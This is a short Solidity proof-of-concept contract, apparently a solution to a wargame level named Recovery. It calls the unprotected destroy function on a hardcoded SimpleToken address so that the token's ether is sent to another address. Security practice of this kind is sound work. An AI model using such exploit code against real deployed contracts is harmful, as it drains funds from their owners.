// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Recovery.sol";
contract POC{

    function run() external {
        SimpleToken level17 = SimpleToken(payable(0x1cC7b9af52fE41E0551c530A4453eF3739F22639));
        
        level17.destroy(payable(0xdB01d94217308046a792D864b16A35837aa52B86));
    }
}